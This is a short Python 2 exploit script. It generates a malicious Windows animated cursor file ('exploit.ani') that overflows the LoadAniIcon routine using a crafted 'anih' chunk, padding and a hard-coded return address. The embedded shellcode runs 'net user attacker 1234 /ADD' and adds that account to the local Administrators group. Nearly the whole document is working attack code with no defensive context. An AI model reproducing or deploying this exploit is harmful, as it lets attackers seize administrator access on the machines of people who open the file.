from struct import *
# Usage: $python2 filename.py 
# hexdump -C exploit.ani

print("[+] Shellcode is being generated.\n")
shellcode = "\xfc\xe8\x44\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b"
shellcode = shellcode + "\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99"
shellcode = shellcode + "\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x04"
shellcode = shellcode + "\x75\xe5\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb"
shellcode = shellcode + "\x8b\x1c\x8b\x01\xeb\x89\x5c\x24\x04\xc3\x31\xc0\x64\x8b\x40\x30"
shellcode = shellcode + "\x85\xc0\x78\x0c\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\xeb\x09"
shellcode = shellcode + "\x8b\x80\xb0\x00\x00\x00\x8b\x68\x3c\x5f\x31\xf6\x60\x56\x89\xf8"
shellcode = shellcode + "\x83\xc0\x7b\x50\x68\xf0\x8a\x04\x5f\x68\x98\xfe\x8a\x0e\x57\xff"
shellcode = shellcode + "\xe7\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x20"
shellcode = shellcode + "\x75\x73\x65\x72\x20\x61\x74\x74\x61\x63\x6b\x65\x72\x20\x31\x32"
shellcode = shellcode + "\x33\x34\x20\x2f\x41\x44\x44\x20\x26\x26\x20\x6e\x65\x74\x20\x6c"
shellcode = shellcode + "\x6f\x63\x61\x6c\x67\x72\x6f\x75\x70\x20\x41\x64\x6d\x69\x6e\x69"
shellcode = shellcode + "\x73\x74\x72\x61\x74\x6f\x72\x73\x20\x61\x74\x74\x61\x63\x6b\x65"
shellcode = shellcode + "\x72\x20\x2f\x41\x44\x44\x00"
print("[+] Shellcode has been generated.\n")

padding2ret = "\x00" * 80 
ret = "\x8f\x1a\x40\x00" # Call EDI address & LoadaniIcon()'s return address
padding2edi = "\x00" * 20 # padding to EDI register from LoadaniIcon()'s return address


print("[+] ANI file header is being generated.\n")
aniheader = "\x52\x49\x46\x46\x00\x00\x00\x00\x41\x43\x4f\x4e\x61\x6e\x69\x68"
aniheader = aniheader + "\x24\x00\x00\x00\x24\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00"
aniheader = aniheader + "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
aniheader = aniheader + "\x04\x00\x00\x00\x01\x00\x00\x00\x61\x6e\x69\x68"
aniheader = aniheader + pack("<l", len(shellcode + padding2ret + ret + padding2edi))
print("[+] ANI file header has been generated\n")



payload = aniheader + padding2ret + ret + padding2edi + shellcode
hFile = open("exploit.ani", 'w')
hFile.write(payload)
hFile.close()
